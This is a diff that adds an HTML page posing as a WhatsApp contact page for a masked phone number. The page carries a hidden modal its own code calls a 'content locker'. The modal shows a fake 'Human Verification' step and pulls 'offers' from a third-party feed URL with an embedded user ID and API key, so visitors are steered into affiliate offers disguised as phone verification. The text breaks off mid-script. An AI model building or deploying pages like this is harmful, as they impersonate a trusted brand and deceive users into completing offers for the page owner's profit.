@@ -1,0 +1,1362 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <title>Chat on WhatsApp</title>
+    <meta name="description" content="Contact us directly on WhatsApp. Send a message and start a conversation." />
+    
+    <!-- Open Graph / Social Meta Tags -->
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Chat on WhatsApp" />
+    <meta property="og:description" content="Contact us directly on WhatsApp. Send a message and start a conversation." />
+    <meta property="og:image" content="https://i.postimg.cc/1XQ5NxXm/cropped-circle-image.png" />
+    
+    <meta name="theme-color" content="#25D366" />
+    
+    <style>
+      /* ==========================================================================
+         Chat on WhatsApp - Full Standalone Styles
+         ========================================================================== */
+      :root {
+        --color-primary: #25D366;
+        --color-primary-hover: #20bd5a;
+        --color-primary-active: #1da850;
+        --color-dark-green: #128C7E;
+        --color-deep-green: #075E54;
+        --color-text-main: #111B21;
+        --color-text-secondary: #667781;
+        --color-border: rgba(17, 27, 33, 0.08);
+        --color-border-subtle: rgba(17, 27, 33, 0.06);
+        --color-trust-bg: #F8FAFC;
+        --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      }
+
+      *, *::before, *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      html, body {
+        min-height: 100%;
+        font-family: var(--font-family);
+        background-color: #FFFFFF;
+        color: var(--color-text-main);
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        line-height: 1.5;
+        overflow-x: hidden;
+      }
+
+      body {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        position: relative;
+        background-color: #FFFFFF;
+      }
+
+      /* Subtle Ambient Background */
+      .bg-decorations {
+        position: fixed;
+        inset: 0;
+        pointer-events: none;
+        z-index: 0;
+        overflow: hidden;
+      }
+
+      .bg-bubble {
+        position: absolute;
+        border-radius: 50%;
+        filter: blur(50px);
+        opacity: 0.35;
+      }
+
+      .bg-bubble-1 {
+        width: 320px;
+        height: 320px;
+        background: rgba(37, 211, 102, 0.05);
+        top: -80px;
+        right: -60px;
+      }
+
+      .bg-bubble-2 {
+        width: 280px;
+        height: 280px;
+        background: rgba(18, 140, 126, 0.04);
+        bottom: -60px;
+        left: -40px;
+      }
+
+      /* Header */
+      .site-header {
+        position: relative;
+        z-index: 100;
+        width: 100%;
+        max-width: 600px;
+        margin: 0 auto;
+        padding: 20px 24px 8px;
+      }
+
+      .header-container {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        position: relative;
+      }
+
+      .header-left-spacer {
+        width: 38px;
+        height: 38px;
+        flex-shrink: 0;
+      }
+
+      .brand-badge {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        text-decoration: none;
+        color: #25d366;
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+        transition: transform 0.15s ease, opacity 0.15s ease;
+      }
+
+      .brand-badge:hover {
+        opacity: 0.92;
+        transform: translateX(-50%) scale(1.02);
+      }
+
+      .brand-icon-wrapper {
+        width: 34px;
+        height: 34px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .header-logo-img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        display: block;
+      }
+
+      .brand-title {
+        font-size: 17px;
+        font-weight: 700;
+        letter-spacing: -0.02em;
+        color: #25d366;
+      }
+
+      /* Header Menu Button & Dropdown */
+      .header-menu-wrapper {
+        position: relative;
+        z-index: 110;
+      }
+
+      .menu-toggle-btn {
+        width: 38px;
+        height: 38px;
+        border-radius: 10px;
+        background: #FFFFFF;
+        border: 1px solid var(--color-border);
+        color: #475569;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+        transition: all 0.18s ease;
+      }
+
+      .menu-toggle-btn:hover {
+        background: #F8FAFC;
+        color: #0F172A;
+        border-color: #CBD5E1;
+        transform: translateY(-1px);
+      }
+
+      .menu-toggle-btn svg {
+        width: 19px;
+        height: 19px;
+      }
+
+      .menu-icon-close {
+        display: none;
+      }
+
+      .header-menu-wrapper.is-open .menu-icon-bars {
+        display: none;
+      }
+
+      .header-menu-wrapper.is-open .menu-icon-close {
+        display: block;
+      }
+
+      .header-menu-wrapper.is-open .menu-toggle-btn {
+        background: #F1F5F9;
+        border-color: #94A3B8;
+        color: #0F172A;
+      }
+
+      .nav-dropdown-menu {
+        position: absolute;
+        top: calc(100% + 8px);
+        right: 0;
+        width: 190px;
+        background: #FFFFFF;
+        border: 1px solid #E2E8F0;
+        border-radius: 14px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08), 0 2px 6px rgba(0, 0, 0, 0.04);
+        opacity: 0;
+        visibility: hidden;
+        transform: translateY(-6px) scale(0.96);
+        transform-origin: top right;
+        transition: all 0.18s cubic-bezier(0.16, 1, 0.3, 1);
+        overflow: hidden;
+        padding: 6px;
+        z-index: 120;
+      }
+
+      .header-menu-wrapper.is-open .nav-dropdown-menu {
+        opacity: 1;
+        visibility: visible;
+        transform: translateY(0) scale(1);
+      }
+
+      .nav-dropdown-list {
+        list-style: none;
+        display: flex;
+        flex-direction: column;
+        gap: 2px;
+      }
+
+      .nav-item-link {
+        display: flex;
+        align-items: center;
+        padding: 8px 12px;
+        font-size: 13px;
+        font-weight: 500;
+        color: #334155;
+        text-decoration: none;
+        border-radius: 8px;
+        transition: background-color 0.12s ease, color 0.12s ease;
+      }
+
+      .nav-item-link:hover {
+        background-color: #F1F5F9;
+        color: #0F172A;
+      }
+
+      .nav-divider {
+        height: 1px;
+        background: #F1F5F9;
+        margin: 4px 6px;
+      }
+
+      .nav-item-highlight {
+        color: #128C7E;
+        font-weight: 600;
+      }
+
+      .nav-item-highlight:hover {
+        background-color: #E8F7F0;
+        color: #075E54;
+      }
+
+      /* Main Layout */
+      .main-wrapper {
+        position: relative;
+        z-index: 10;
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 16px 16px 32px;
+      }
+
+      .contact-card {
+        width: 100%;
+        max-width: 460px;
+        background-color: transparent;
+        border: none;
+        padding: 20px 20px 28px;
+        text-align: center;
+        position: relative;
+        animation: cardFadeIn 0.55s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+      }
+
+      @keyframes cardFadeIn {
+        from { opacity: 0; transform: translateY(14px) scale(0.98); }
+        to { opacity: 1; transform: translateY(0) scale(1); }
+      }
+
+      /* Profile Section */
+      .profile-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 20px;
+      }
+
+      .avatar-wrapper {
+        position: relative;
+        width: 96px;
+        height: 96px;
+        margin-bottom: 14px;
+        border-radius: 50%;
+        padding: 2.5px;
+        border: 2.2px solid var(--color-primary);
+        background-color: #FFFFFF;
+        box-shadow: 0 1px 4px rgba(37, 211, 102, 0.2), 0 4px 14px rgba(11, 20, 26, 0.06);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .avatar-image {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        border-radius: 50%;
+        background-color: #E9EDEF;
+        display: block;
+      }
+
+      .online-indicator {
+        position: absolute;
+        bottom: 1px;
+        right: 1px;
+        width: 17px;
+        height: 17px;
+        background-color: var(--color-primary);
+        border: 2.5px solid #FFFFFF;
+        border-radius: 50%;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
+        z-index: 3;
+      }
+
+      .quick-status-line {
+        display: inline-flex;
+        align-items: center;
+        gap: 7px;
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--color-dark-green);
+        background: rgba(37, 211, 102, 0.1);
+        padding: 4px 12px;
+        border-radius: 9999px;
+      }
+
+      .status-dot {
+        width: 7px;
+        height: 7px;
+        background-color: var(--color-primary);
+        border-radius: 50%;
+        display: inline-block;
+        box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.3);
+      }
+
+      /* Text Content */
+      .hero-heading {
+        font-size: 22px;
+        font-weight: 700;
+        color: var(--color-text-main);
+        line-height: 1.35;
+        margin-bottom: 10px;
+        letter-spacing: -0.015em;
+        word-break: break-word;
+      }
+
+      .whatsapp-text-highlight {
+        color: #25d366;
+      }
+
+      .phone-highlight {
+        display: inline-block;
+        color: var(--color-deep-green);
+        white-space: nowrap;
+      }
+
+      .hero-subtitle {
+        font-size: 14.5px;
+        color: var(--color-text-secondary);
+        line-height: 1.5;
+        margin-bottom: 24px;
+        padding: 0 4px;
+      }
+
+      /* CTA Buttons */
+      .cta-group {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        margin-bottom: 26px;
+      }
+
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        width: 100%;
+        padding: 15px 20px;
+        font-size: 16px;
+        font-weight: 600;
+        font-family: inherit;
+        text-decoration: none;
+        border-radius: 14px;
+        cursor: pointer;
+        transition: all 0.2s cubic-bezier(0.2, 0, 0, 1);
+        user-select: none;
+        min-height: 52px;
+      }
+
+      .btn:active {
+        transform: scale(0.985);
+      }
+
+      .btn-primary {
+        background-color: var(--color-primary);
+        color: #FFFFFF;
+        border: 1px solid rgba(0, 0, 0, 0.04);
+        box-shadow: 0 6px 18px rgba(37, 211, 102, 0.32);
+      }
+
+      .btn-primary:hover {
+        background-color: var(--color-primary-hover);
+        box-shadow: 0 8px 24px rgba(37, 211, 102, 0.42);
+        transform: translateY(-1.5px);
+      }
+
+      .btn-logo-img {
+        width: 24px;
+        height: 24px;
+        object-fit: contain;
+        display: block;
+      }
+
+      .btn-secondary {
+        background-color: #FFFFFF;
+        color: var(--color-dark-green);
+        border: 1.5px solid var(--color-primary);
+      }
+
+      .btn-secondary:hover {
+        background-color: rgba(37, 211, 102, 0.06);
+        border-color: var(--color-primary-hover);
+        color: var(--color-deep-green);
+        transform: translateY(-1px);
+      }
+
+      .btn-secondary svg {
+        width: 19px;
+        height: 19px;
+        stroke: currentColor;
+        stroke-width: 2;
+        fill: none;
+      }
+
+      /* Trust Section */
+      .trust-section {
+        background-color: var(--color-trust-bg);
+        border-radius: 16px;
+        padding: 16px 14px;
+        border: 1px solid var(--color-border-subtle);
+      }
+
+      .trust-list {
+        list-style: none;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .trust-item {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        text-align: left;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--color-text-main);
+      }
+
+      .trust-icon-box {
+        width: 26px;
+        height: 26px;
+        background: rgba(37, 211, 102, 0.12);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--color-dark-green);
+        flex-shrink: 0;
+      }
+
+      .trust-icon-box svg {
+        width: 14px;
+        height: 14px;
+        stroke: currentColor;
+        stroke-width: 2.2;
+        fill: none;
+      }
+
+      /* Footer */
+      .site-footer {
+        position: relative;
+        z-index: 10;
+        text-align: center;
+        padding: 12px 20px 24px;
+        font-size: 12.5px;
+        color: var(--color-text-secondary);
+      }
+
+      .footer-highlight {
+        font-weight: 600;
+        color: var(--color-dark-green);
+      }
+
+      /* ==========================================================================
+         Verification Modal & Native Content Locker
+         ========================================================================== */
+      .modal-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 1000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 16px;
+        visibility: hidden;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.25s cubic-bezier(0.16, 1, 0.3, 1), visibility 0.25s ease;
+      }
+
+      .modal-overlay.is-active {
+        visibility: visible;
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      .modal-backdrop {
+        position: absolute;
+        inset: 0;
+        background-color: rgba(11, 20, 26, 0.68);
+        backdrop-filter: blur(5px);
+        -webkit-backdrop-filter: blur(5px);
+      }
+
+      .modal-container {
+        position: relative;
+        width: 100%;
+        max-width: 420px;
+        background: #ffffff;
+        border-radius: 20px;
+        box-shadow: 0 16px 40px rgba(11, 20, 26, 0.24), 0 4px 12px rgba(0, 0, 0, 0.08);
+        overflow: hidden;
+        z-index: 2;
+        transform: scale(0.94) translateY(12px);
+        transition: transform 0.28s cubic-bezier(0.34, 1.56, 0.64, 1);
+      }
+
+      .modal-overlay.is-active .modal-container {
+        transform: scale(1) translateY(0);
+      }
+
+      .modal-close-btn {
+        position: absolute;
+        top: 12px;
+        right: 12px;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: #F0F2F5;
+        border: none;
+        color: #54656F;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        z-index: 10;
+        transition: all 0.15s ease;
+      }
+
+      .modal-close-btn:hover {
+        background: #E9EDEF;
+        color: #111B21;
+        transform: scale(1.08);
+      }
+
+      .modal-close-btn svg {
+        width: 17px;
+        height: 17px;
+      }
+
+      /* Native Locker Modal Body */
+      .locker-modal-body {
+        width: 100%;
+        background: #ffffff;
+        padding: 24px 20px 20px;
+        overflow-y: auto;
+        max-height: 85vh;
+      }
+
+      .locker-container {
+        width: 100%;
+        max-width: 380px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        margin: 0 auto;
+      }
+
+      .whatsapp-icon-wrapper {
+        margin-bottom: 12px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .whatsapp-icon-img {
+        width: 60px;
+        height: 60px;
+        object-fit: contain;
+        filter: drop-shadow(0 4px 12px rgba(0, 168, 132, 0.25));
+      }
+
+      .verification-banner {
+        width: 100%;
+        background-color: #f0fdf4;
+        border: 1px solid #dcfce7;
+        border-radius: 13px;
+        padding: 11px 14px;
+        margin-bottom: 14px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 3px;
+      }
+
+      .verification-header {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        color: #059669;
+        font-size: 14.5px;
+        font-weight: 700;
+      }
+
+      .verification-header svg {
+        width: 16px;
+        height: 16px;
+        stroke-width: 2.3;
+      }
+
+      .verification-subtitle {
+        font-size: 12.5px;
+        color: #334155;
+        line-height: 1.4;
+        font-weight: 500;
+      }
+
+      .verification-subtitle .highlight {
+        color: #059669;
+        font-weight: 700;
+      }
+
+      .offers-card-container {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        margin-bottom: 14px;
+        text-align: left;
+      }
+
+      .offer-row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 10px 12px;
+        gap: 10px;
+        background: #ffffff;
+        border: 1px solid #e2e8f0;
+        border-radius: 12px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+        transition: all 0.15s ease;
+      }
+
+      .offer-row:hover {
+        background-color: #fafbfc;
+        border-color: #cbd5e1;
+      }
+
+      .offer-left {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        flex: 1;
+        min-width: 0;
+      }
+
+      .offer-app-icon {
+        width: 38px;
+        height: 38px;
+        border-radius: 9px;
+        flex-shrink: 0;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #f8fafc;
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
+      }
+
+      .offer-app-icon img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        display: block;
+      }
+
+      .offer-text-content {
+        flex: 1;
+        min-width: 0;
+        padding-right: 4px;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .offer-title {
+        font-size: 11.5px;
+        font-weight: 700;
+        color: #0f172a;
+        line-height: 1.3;
+        margin-bottom: 2px;
+        white-space: normal;
+        word-break: break-word;
+      }
+
+      .offer-desc {
+        font-size: 11px;
+        color: #059669;
+        font-weight: 600;
+        line-height: 1.2;
+      }
+
+      .offer-open-btn {
+        flex-shrink: 0;
+        background-color: #25d366;
+        color: #ffffff;
+        font-size: 11.5px;
+        font-weight: 700;
+        border: none;
+        border-radius: 7px;
+        padding: 5px 14px;
+        height: 28px;
+        min-width: 58px;
+        cursor: pointer;
+        transition: all 0.15s ease;
+        box-shadow: 0 1px 4px rgba(37, 211, 102, 0.28);
+      }
+
+      .offer-open-btn:hover {
+        background-color: #20bd5a;
+        transform: translateY(-1px);
+        box-shadow: 0 3px 8px rgba(37, 211, 102, 0.38);
+      }
+
+      .bottom-notice {
+        width: 100%;
+        background-color: #f8fafc;
+        border: 1px solid #e2e8f0;
+        border-radius: 11px;
+        padding: 9px 12px;
+        margin-bottom: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        font-size: 11.5px;
+        color: #334155;
+        font-weight: 500;
+      }
+
+      .bottom-notice svg {
+        width: 15px;
+        height: 15px;
+        color: #059669;
+        stroke-width: 2.2;
+        flex-shrink: 0;
+      }
+
+      .bottom-notice strong {
+        color: #059669;
+        font-weight: 700;
+      }
+
+      .timer-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 2px;
+      }
+
+      .timer-display {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+        color: #059669;
+        font-size: 14px;
+        font-weight: 700;
+      }
+
+      .timer-display svg {
+        width: 15px;
+        height: 15px;
+        stroke-width: 2.2;
+      }
+
+      .timer-subtext {
+        font-size: 10.5px;
+        color: #94a3b8;
+        font-weight: 500;
+      }
+
+      /* Responsive */
+      @media (max-width: 480px) {
+        .modal-container {
+          max-width: 95vw;
+          border-radius: 18px;
+        }
+        .locker-modal-body {
+          padding: 22px 14px 16px;
+        }
+        .contact-card {
+          padding: 16px 12px 20px;
+        }
+        .avatar-wrapper {
+          width: 88px;
+          height: 88px;
+        }
+        .hero-heading {
+          font-size: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Ambient Background -->
+    <div class="bg-decorations" aria-hidden="true">
+      <div class="bg-bubble bg-bubble-1"></div>
+      <div class="bg-bubble bg-bubble-2"></div>
+    </div>
+
+    <!-- Header with Centered WhatsApp Logo and Menu Icon -->
+    <header class="site-header" id="header-section">
+      <div class="header-container">
+        <div class="header-left-spacer" aria-hidden="true"></div>
+
+        <!-- Centered WhatsApp Logo -->
+        <a href="/" class="brand-badge" id="header-brand-logo" aria-label="WhatsApp">
+          <div class="brand-icon-wrapper" aria-hidden="true">
+            <img 
+              src="Images/wtsp logo png d.png" 
+              alt="WhatsApp Logo" 
+              class="header-logo-img"
+              referrerpolicy="no-referrer"
+            />
+          </div>
+          <span class="brand-title">WhatsApp</span>
+        </a>
+
+        <!-- Right Menu Icon & Dropdown List -->
+        <div class="header-menu-wrapper" id="header-nav-wrapper">
+          <button 
+            type="button" 
+            class="menu-toggle-btn" 
+            id="menu-toggle-btn" 
+            aria-label="Open menu"
+            aria-expanded="false"
+            aria-controls="nav-dropdown-menu"
+          >
+            <svg class="menu-icon-bars" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="3" y1="12" x2="21" y2="12"></line>
+              <line x1="3" y1="6" x2="21" y2="6"></line>
+              <line x1="3" y1="18" x2="21" y2="18"></line>
+            </svg>
+            <svg class="menu-icon-close" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </button>
+
+          <!-- Dropdown Navigation -->
+          <nav class="nav-dropdown-menu" id="nav-dropdown-menu" aria-label="Main navigation">
+            <ul class="nav-dropdown-list">
+              <li><a href="#home" class="nav-item-link" id="nav-link-home">Home</a></li>
+              <li><a href="#features" class="nav-item-link" id="nav-link-features">Features</a></li>
+              <li><a href="#privacy" class="nav-item-link" id="nav-link-privacy">Privacy</a></li>
+              <li><a href="#blog" class="nav-item-link" id="nav-link-blog">Blog</a></li>
+              <li><a href="#apps" class="nav-item-link" id="nav-link-apps">Apps</a></li>
+              <li><a href="#help-center" class="nav-item-link" id="nav-link-help">Help Center</a></li>
+              <li class="nav-divider"></li>
+              <li><a href="#for-business" class="nav-item-link nav-item-highlight" id="nav-link-business">For Business</a></li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="main-wrapper" id="main-content">
+      <div class="contact-card" id="contact-hero-card">
+        
+        <!-- Profile Section -->
+        <div class="profile-section">
+          <div class="avatar-wrapper" id="profile-avatar-container">
+            <img 
+              id="profile-img"
+              src="Images/cropped_circle_image.png" 
+              alt="Profile photo" 
+              class="avatar-image" 
+              referrerpolicy="no-referrer"
+            />
+            <div class="online-indicator" title="Online now" aria-label="Online status indicator"></div>
+          </div>
+          
+          <div class="quick-status-line">
+            <span class="status-dot"></span>
+            <span>Online</span>
+          </div>
+        </div>
+
+        <!-- Hero Text -->
+        <h1 class="hero-heading" id="main-heading">
+          Chat on <span class="whatsapp-text-highlight">WhatsApp</span> with <span class="phone-highlight">+212 77****764</span>
+        </h1>
+        
+        <p class="hero-subtitle" id="supporting-text">
+          Send me a message on WhatsApp .
+        </p>
+
+        <!-- CTA Buttons -->
+        <div class="cta-group" id="cta-actions">
+          <button 
+            type="button"
+            class="btn btn-primary" 
+            id="primary-cta"
+            aria-label="Send WhatsApp message"
+          >
+            <img 
+              src="Images/wtsp logo png d.png" 
+              alt="WhatsApp" 
+              class="btn-logo-img"
+              referrerpolicy="no-referrer"
+            />
+            <span>Send Message</span>
+          </button>
+
+          <button 
+            type="button"
+            class="btn btn-secondary" 
+            id="secondary-cta"
+            aria-label="Open conversation in WhatsApp Web"
+          >
+            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+              <line x1="8" y1="21" x2="16" y2="21"></line>
+              <line x1="12" y1="17" x2="12" y2="21"></line>
+            </svg>
+            <span>Continue to WhatsApp Web</span>
+          </button>
+        </div>
+
+        <!-- Trust Section -->
+        <div class="trust-section" id="trust-points-section">
+          <ul class="trust-list">
+            <li class="trust-item">
+              <div class="trust-icon-box" aria-hidden="true">
+                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                  <polyline points="9 12 11 14 15 10"></polyline>
+                </svg>
+              </div>
+              <span>Direct WhatsApp chat</span>
+            </li>
+
+            <li class="trust-item">
+              <div class="trust-icon-box" aria-hidden="true">
+                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                </svg>
+              </div>
+              <span>Fast & easy contact</span>
+            </li>
+
+            <li class="trust-item">
+              <div class="trust-icon-box" aria-hidden="true">
+                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                  <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                </svg>
+              </div>
+              <span>Mobile & desktop supported</span>
+            </li>
+          </ul>
+        </div>
+
+      </div>
+    </main>
+
+    <!-- Minimal Footer -->
+    <footer class="site-footer" id="footer-section">
+      <p class="footer-highlight">Contact us directly through WhatsApp</p>
+      <p class="footer-copy">&copy; 2026</p>
+    </footer>
+
+    <!-- Verification Modal Overlay (Built-in Native Content Locker) -->
+    <div class="modal-overlay" id="locker-modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="modal-close-btn">
+      <div class="modal-backdrop" id="modal-backdrop"></div>
+      <div class="modal-container">
+        <!-- Close Button in Top-Right -->
+        <button class="modal-close-btn" id="modal-close-btn" aria-label="Close verification modal" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+
+        <!-- Verification Content Locker Body -->
+        <div class="locker-modal-body">
+          <div class="locker-container">
+            <!-- 1. Top WhatsApp Logo -->
+            <div class="whatsapp-icon-wrapper">
+              <img 
+                src="Images/wtsp logo png d.png" 
+                alt="WhatsApp Verification" 
+                class="whatsapp-icon-img"
+                referrerpolicy="no-referrer"
+              />
+            </div>
+
+            <!-- 2. Human Verification Notice Card with Main Instruction Text -->
+            <div class="verification-banner">
+              <div class="verification-header">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span>Human Verification</span>
+              </div>
+              <p class="verification-subtitle">
+                Please Complete <span class="highlight">WhatsApp verification</span> by verifying your Phone number
+              </p>
+            </div>
+
+            <!-- 3. Offers Box (Cards with Space Between) -->
+            <div class="offers-card-container" id="offers-container">
+              <!-- Server 1 -->
+              <div class="offer-row" id="offer-row-1">
+                <div class="offer-left">
+                  <div class="offer-app-icon">
+                    <img src="Images/locker without bg.png" alt="Icon" referrerpolicy="no-referrer">
+                  </div>
+                  <div class="offer-text-content">
+                    <h3 class="offer-title">Verify your phone number to continue</h3>
+                    <p class="offer-desc">Server 1</p>
+                  </div>
+                </div>
+                <button type="button" class="offer-open-btn" id="offer-btn-1">Verify</button>
+              </div>
+
+              <!-- Server 2 -->
+              <div class="offer-row" id="offer-row-2">
+                <div class="offer-left">
+                  <div class="offer-app-icon">
+                    <img src="Images/locker without bg.png" alt="Icon" referrerpolicy="no-referrer">
+                  </div>
+                  <div class="offer-text-content">
+                    <h3 class="offer-title">Verify your phone number to continue</h3>
+                    <p class="offer-desc">Server 2</p>
+                  </div>
+                </div>
+                <button type="button" class="offer-open-btn" id="offer-btn-2">Verify</button>
+              </div>
+            </div>
+
+            <!-- 4. Bottom Notice Banner -->
+            <div class="bottom-notice">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              </svg>
+              <span>if the <strong>server</strong> 1 doesn't work use the <strong>server</strong> 2</span>
+            </div>
+
+            <!-- 5. Countdown Timer & Real-time Subtext -->
+            <div class="timer-section">
+              <div class="timer-display">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                  <circle cx="12" cy="12" r="10"></circle>
+                  <polyline points="12 6 12 12 16 14"></polyline>
+                </svg>
+                <span id="countdown-timer">9:37</span>
+              </div>
+              <span class="timer-subtext">Offers refresh in real-time</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Complete Vanilla JavaScript -->
+    <script>
+      document.addEventListener('DOMContentLoaded', () => {
+        const primaryBtn = document.getElementById('primary-cta');
+        const secondaryBtn = document.getElementById('secondary-cta');
+        
+        // Navigation Menu
+        const menuNavWrapper = document.getElementById('header-nav-wrapper');
+        const menuToggleBtn = document.getElementById('menu-toggle-btn');
+        const navDropdownMenu = document.getElementById('nav-dropdown-menu');
+
+        if (menuToggleBtn && menuNavWrapper) {
+          menuToggleBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const isOpen = menuNavWrapper.classList.toggle('is-open');
+            menuToggleBtn.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
+          });
+
+          document.addEventListener('click', (e) => {
+            if (menuNavWrapper.classList.contains('is-open') && !menuNavWrapper.contains(e.target)) {
+              menuNavWrapper.classList.remove('is-open');
+              menuToggleBtn.setAttribute('aria-expanded', 'false');
+            }
+          });
+
+          if (navDropdownMenu) {
+            navDropdownMenu.querySelectorAll('.nav-item-link').forEach(link => {
+              link.addEventListener('click', () => {
+                menuNavWrapper.classList.remove('is-open');
+                menuToggleBtn.setAttribute('aria-expanded', 'false');
+              });
+            });
+          }
+        }
+
+        // Modal Elements
+        const lockerModal = document.getElementById('locker-modal');
+        const modalCloseBtn = document.getElementById('modal-close-btn');
+        const modalBackdrop = document.getElementById('modal-backdrop');
+        const offersContainer = document.getElementById('offers-container');
+
+        // Offers Feed & URLs
+        const OFFERS_FEED_URL = 'https://d1cdbd1x576ga0.cloudfront.net/public/offers/feed.php?user_id=536541&api_key=b18c81828ee8bdf3b552ed2e5bf88f92&s1=&s2=';
+        const LOCKER_ICON_URL = 'https://i.postimg.cc/LXnmWzQn/locker-without-bg.png';
+
+        const DEFAULT_OFFERS = [
+          {
+            id: 'server_1',
+            name: 'Verify your phone number to continue',
+            anchor: 'Server 1',
+            conversion: 'Server 1',
+            network_icon: LOCKER_ICON_URL,
+            url: '#'
+          },
+          {
+            id: 'server_2',
+            name: 'Verify your phone number to continue',
+            anchor: 'Server 2',
+            conversion: 'Server 2',
+            network_icon: LOCKER_ICON_URL,
+            url: '#'
+          }
+        ];
+
+        // Handle Offer Button Click
+        function handleOfferClick(offerIndex, offerUrl) {
+          if (offerUrl && offerUrl !== '#' && !offerUrl.includes('wa.me')) {
+            try {
+              window.open(offerUrl, '_blank', 'noopener,noreferrer');
+            } catch (e) {
+              console.error('Could not open offer URL:', e);
+            }
+          }
+        }
+
+        // Render Offer Cards
+        function renderDirectOffers(offers) {
+          if (!offersContainer) return;
+          offersContainer.innerHTML = '';
+
+          const displayOffers = (offers && offers.length > 0) ? offers : DEFAULT_OFFERS;
+
